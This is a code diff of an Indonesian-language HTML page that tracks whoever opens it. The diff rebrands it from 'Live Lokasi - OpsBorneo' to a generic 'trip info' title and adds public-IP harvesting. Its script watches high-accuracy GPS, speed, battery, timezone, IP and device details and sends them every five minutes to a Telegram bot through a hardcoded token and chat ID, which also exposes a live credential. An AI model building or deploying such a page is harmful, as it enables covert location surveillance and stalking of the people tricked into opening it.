@@ -1,96 +1,128 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Live Lokasi Otomatis - OpsBorneo</title>
+  <title>Info Perjalanan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: sans-serif; padding: 20px; background: #f2f2f2; }
-    #status { margin-top: 20px; padding: 15px; background: white; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
+    body { font-family: sans-serif; margin: 20px; background: #fdfdfd; color: #333; }
+    .card {
+      background: #fff;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      margin-top: 20px;
+    }
+    h2 { font-size: 20px; margin-bottom: 5px; }
+    small { color: gray; }
+    .map-link { margin-top: 10px; display: block; color: #0066cc; }
   </style>
 </head>
 <body>
-  <h2>Live Lokasi - OpsBorneo</h2>
-  <p>Halaman ini akan terus mengirim lokasi kamu secara otomatis setiap 5 menit selama halaman terbuka.</p>
-  <div id="status">Menunggu lokasi...</div>
+
+  <h2>Info Perjalanan Aktif</h2>
+  <p>Halaman ini akan terus mencatat dan mengirim informasi lokasi setiap 5 menit selama halaman terbuka.</p>
+
+  <div id="status" class="card">Memuat lokasi...</div>
 
   <script>
     const TOKEN = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
     const chatId = "5677912817";
     const userId = "Uta001";
-
-    let lastSent = 0;
     const interval = 300000; // 5 menit
+    let lastSent = 0;
 
-    async function getBatteryInfo() {
+    async function getIP() {
       try {
-        const battery = await navigator.getBattery();
-        return `Battery: ${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Not Charging"})`;
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
       } catch {
-        return "Battery: Unknown";
+        return "Unknown IP";
       }
     }
 
-    function kirimInfo(pos) {
+    async function getBatteryInfo() {
+      if (!navigator.getBattery) return { level: "?", charging: "?" };
+      const battery = await navigator.getBattery();
+      return {
+        level: Math.round(battery.level * 100) + "%",
+        charging: battery.charging ? "Charging" : "Not Charging"
+      };
+    }
+
+    function formatDate(date) {
+      return date.toLocaleString("id-ID");
+    }
+
+    async function kirimData(pos) {
       const now = Date.now();
       if (now - lastSent < interval) return;
 
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-      const speed = pos.coords.speed ?? "Unknown";
-      const heading = pos.coords.heading ?? "Unknown";
-      const altitude = pos.coords.altitude ?? "Unknown";
-      const accuracy = pos.coords.accuracy;
+      const accuracy = pos.coords.accuracy + "m";
+      const heading = pos.coords.heading || 0;
+      const altitude = pos.coords.altitude || "Unknown";
+      const speed = pos.coords.speed ? pos.coords.speed.toFixed(2) + " m/s" : "Unknown";
 
-      const language = navigator.language || "Unknown";
-      const userAgent = navigator.userAgent;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const timeLocal = new Date().toLocaleString();
-      const timeUTC = new Date().toUTCString();
+      const ip = await getIP();
+      const battery = await getBatteryInfo();
+      const lang = navigator.language;
+      const ua = navigator.userAgent;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const nowLocal = new Date();
 
-      getBatteryInfo().then(batteryInfo => {
-        const pesan = `
-[ID: ${userId}]
+      const msg = `[ID: ${userId}]
 Lokasi dikirim: ${lat}, ${lon}
 https://maps.google.com/?q=${lat},${lon}
 
 Speed: ${speed}
 Heading: ${heading}
 Altitude: ${altitude}
-Accuracy: ${accuracy}m
+Accuracy: ${accuracy}
 
-Lang: ${language}
-TZ: ${timezone}
-Local: ${timeLocal}
-UTC: ${timeUTC}
+Lang: ${lang}
+TZ: ${tz}
+Local: ${formatDate(nowLocal)}
+UTC: ${nowLocal.toUTCString()}
 
-${batteryInfo}
-Device: ${userAgent}`.trim();
+Battery: ${battery.level} (${battery.charging})
+IP: ${ip}
+Device: ${ua}`;
 
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`;
-
-        fetch(url)
-          .then(() => {
-            document.getElementById("status").innerText = pesan;
-            lastSent = now;
-          })
-          .catch(() => {
-            document.getElementById("status").innerText = "Gagal mengirim lokasi.";
-          });
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
       });
+
+      document.getElementById("status").innerHTML = `
+        <b>[${userId}]</b><br>
+        Lokasi terkirim: <b>${lat.toFixed(6)}, ${lon.toFixed(6)}</b><br>
+        <a class="map-link" href="https://maps.google.com/?q=${lat},${lon}" target="_blank">Lihat di Google Maps</a><br><br>
+        Speed: ${speed} | Heading: ${heading}<br>
+        Altitude: ${altitude} | Accuracy: ${accuracy}<br>
+        Battery: ${battery.level} (${battery.charging})<br>
+        IP: ${ip}<br>
+        TZ: ${tz} | Local: ${formatDate(nowLocal)}<br>
+        Device: <small>${ua}</small>
+      `;
+      lastSent = now;
     }
 
-    function gagalAmbilLokasi(err) {
-      document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Pastikan izin diberikan.";
+    function gagal() {
+      document.getElementById("status").innerText = "Gagal mendapatkan lokasi.";
     }
 
     if ("geolocation" in navigator) {
-      navigator.geolocation.watchPosition(kirimInfo, gagalAmbilLokasi, {
+      navigator.geolocation.watchPosition(kirimData, gagal, {
         enableHighAccuracy: true,
         maximumAge: 10000,
         timeout: 10000
       });
     } else {
-      document.getElementById("status").innerText = "Browser tidak mendukung geolokasi.";
+      document.getElementById("status").innerText = "Perangkat tidak mendukung geolokasi.";
     }
   </script>
 </body>
